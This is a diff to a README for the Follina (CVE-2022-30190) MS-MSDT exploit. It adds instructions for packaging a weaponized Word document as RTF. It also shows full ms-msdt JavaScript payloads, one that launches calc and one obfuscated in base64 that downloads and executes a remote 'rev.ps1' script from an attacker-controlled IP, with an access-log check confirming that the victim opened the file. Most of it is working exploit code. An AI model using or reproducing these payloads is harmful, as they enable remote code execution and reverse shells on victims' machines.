@@ -11,6 +11,18 @@ CVE-2022-30190 | MS-MSDT Follina One Click
 8. Compress back to Docx file (Send to > Compressed (zipped) folder  |  Rename file type from zip > docx/doc )
 
 --------------------------------------------------------------------------------------------------------
+### RTF File Type
+Once a docx has been saved utilizing the paramaters step / paramaters below. Save the Docx as an RTF.
+
+> If you also add these elements under the `<o:OLEObject>` element in `word/document.xml` at step 3:
+
+```
+<o:LinkType>EnhancedMetaFile</o:LinkType>
+<o:LockedField>false</o:LockedField>
+<o:FieldCodes>\f 0</o:FieldCodes>
+```
+
+--------------------------------------------------------------------------------------------------------
 The act of recompressing can be observed from JohnHammond's Python Script as well:
     ~ Rebuild the original office file ~
     shutil.make_archive(args.output, "zip", doc_path)
@@ -26,7 +38,9 @@ Reference: https://github.com/JohnHammond/msdt-follina/blob/main/follina.py
 
 
 
-## Payloads (Basic Calc Execute):
+## Payloads 
+
+### Basic Calc Execute:
 
 window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Start-Process('calc'))i/../../../../../../../../../../../../../../Windows/system32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
 </script>
@@ -35,7 +49,7 @@ window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_Rebrow
 Can Replace the Start-Process('calc') with:
 > IEX('calc.exe')
 --------------------------------------------------------------------------------------------------------
-## PS1 File Load:
+### PS1 File Load:
 
 window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'cG93ZXJzaGVsbC5leGUgLWMgImlleCAoaXdyIGh0dHA6Ly8xOTIuMTY4LjE5OC4xMjgvcmV2LnBzMSAtVXNlQmFzaWNQYXJzaW5nKSIK'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe \"";
 </script>  
@@ -45,6 +59,6 @@ Decoded:
 Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("powershell.exe -c "iex (iwr http://192.168.198.128/rev.ps1 -UseBasicParsing)""))
 
 --------------------------------------------------------------------------------------------------------
-## Apache2 access.log should show connection upon opening file
+### Apache2 access.log should show connection upon opening file
 ![Log Example](/log.png?raw=true "Example")
 
